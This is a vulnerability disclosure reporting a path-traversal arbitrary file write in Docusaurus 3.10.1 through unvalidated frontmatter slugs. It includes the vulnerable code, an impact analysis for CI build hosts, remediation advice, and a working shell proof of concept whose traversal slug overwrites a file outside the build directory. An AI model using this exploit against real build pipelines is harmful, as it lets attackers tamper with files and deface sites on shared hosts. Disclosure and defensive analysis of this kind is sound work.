https://github.com/facebook/docusaurus

## Finding: Arbitrary file write on the build host via unvalidated blog/docs slug frontmatter (path traversal in static site generation)

Affected Versions: confirmed on 3.10.1 (latest release)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L (7.1 High)

CWE: CWE-22 Improper Limitation of a Pathname to a Restricted Directory (arbitrary file write)

### Disclosure
 - 10 June 2026 - reported via FB Bug Bounty
 - 21 July 2026 - FB closed without explaination "Due to the volume of reports we currently receive, we are unable to provide detailed information as to how we reached this decision."

### Summary

A content document's frontmatter slug is used, unvalidated, as the route pathname, and the static site generator joins that pathname to the output directory and writes the rendered HTML to it with no containment. A blog post (or doc, or page) whose frontmatter contains a slug with parent-directory segments causes docusaurus build to write the post's HTML to an attacker-chosen path outside the output directory, on the build host. The static-file write happens during generation, before the broken-links check runs, so the malicious file is written even on a default configuration where the build then reports failure. fs.ensureDir is called first, so intermediate directories are created as needed. This was confirmed end to end on Docusaurus 3.10.1.

### Details

Source. Blog frontmatter slug is validated only as a string (packages/docusaurus-plugin-content-blog/src/frontMatter.ts: `slug: Joi.string()`), with no pathname or parent-directory check; docs (plugin-content-docs/src/frontMatter.ts) and pages (plugin-content-pages/src/frontMatter.ts) are the same. The slug becomes the permalink:

```
// packages/docusaurus-plugin-content-blog/src/blogUtils.ts
const slug = frontMatter.slug ?? parsedBlogFileName.slug;
const permalink = normalizeUrl([baseUrl, routeBasePath, slug]);
```

normalizeUrl (packages/docusaurus-utils/src/urlUtils.ts) only collapses and deduplicates slashes; it does not resolve or strip `..` segments, so the permalink keeps the traversal.

Sink. The static site generator writes each route's HTML using the permalink as the path, with no confinement (packages/docusaurus/src/ssg/ssgUtils.ts):

```ts
function pathnameToFilename({pathname, trailingSlash}): string {
  const outputFileName = pathname.replace(/^[/\\]/, ''); // removes ONE leading slash only
  if (/\.html?$/i.test(outputFileName)) return outputFileName;
  if (typeof trailingSlash === 'undefined') return path.join(outputFileName, 'index.html');
  ...
}

export async function writeStaticFile({content, pathname, params}): Promise<void> {
  const filename = pathnameToFilename({pathname: removeBaseUrl(pathname, params.baseUrl), trailingSlash: params.trailingSlash});
  const filePath = path.join(params.outDir, filename);   // no realpath / is-inside-outDir check
  await fs.ensureDir(path.dirname(filePath));             // creates intermediate dirs
  await fs.writeFile(filePath, content);                 // arbitrary write
}
```

Because only one leading slash is stripped, a slug like `/../../../../tmp/evil` yields `filename = "../../../../tmp/evil/index.html"`, and `path.join(outDir, filename)` collapses the `..` segments and escapes outDir to `/tmp/evil/index.html`. The written content is the rendered HTML of the attacker's markdown or MDX, which is attacker-controlled. The filename is index.html under the attacker-chosen directory (or `<name>.html` when trailingSlash is false).

A secondary effect exists on the read side: the blog RSS/Atom feed reads each post's built HTML back via readOutputHTMLFile (packages/docusaurus-utils/src/emitUtils.ts: `path.join(outDir, permalink, 'index.html')`, also unconfined) and embeds it into the public feed, so if the traversed path already contains a readable index.html or `.html` file that the write does not overwrite, its contents are disclosed in the generated rss.xml/atom.xml.

### PoC

poc_slug_arbitrary_write.sh. Requires Node >= 20.

```bash
npx create-docusaurus@latest site classic --javascript
mkdir -p /tmp/leaktarget && echo 'ORIGINAL-VICTIM-FILE' > /tmp/leaktarget/index.html

cat > site/blog/2026-01-01-evil.md <<'POST'
---
title: Evil Post
authors: []
slug: /../../../../../../../../../../tmp/leaktarget
---
Body becomes the HTML written to the traversed path.
POST

cd site && npm run build   # default config: build reports failure, but the file is already written
head -c 80 /tmp/leaktarget/index.html
```

Observed on Docusaurus 3.10.1 with the default scaffold (onBrokenLinks: 'throw'): the build exits non-zero (broken links), but `/tmp/leaktarget/index.html` has been replaced with the post's rendered HTML:

```
<!doctype html><html lang=en dir=ltr class="blog-wrapper blog-post-page plugin-blog ... Docusaurus v3.10.1 ...
```

That is, the static-file write traverses out of the build directory and overwrites an arbitrary host file before the broken-links check aborts the build. With onBrokenLinks set to warn or ignore (common), the build also succeeds.

### Impact

Building an untrusted content document writes attacker-controlled HTML to an arbitrary path on the build host, outside the intended output directory, and creates intermediate directories. The realistic exposure is continuous integration: a large number of projects build Docusaurus blog and docs content on CI, including automatic preview builds of pull requests. A pull request that adds a post with a traversal slug causes the CI runner to write attacker HTML outside the workspace, which enables defacement of other sites built on the same host, poisoning of co-located build outputs or served webroots, and tampering with files on a shared CI runner. The write happens even when the build is configured to fail on broken links. The secondary read path additionally allows disclosing the contents of an existing index.html or `.html` file on the host through the public feed.

### Remediation

Validate the slug as a confined pathname in the content plugins (reject `..` segments and absolute escapes, for example by reusing the existing isValidPathname / PathnameSchema), and enforce containment at the write sink: in writeStaticFile (ssgUtils.ts), resolve the final path and assert it stays within params.outDir (path.relative(outDir, filePath) must not start with `..` and must not be absolute) before fs.ensureDir / fs.writeFile. Apply the same containment to the read sink readOutputHTMLFile (emitUtils.ts).
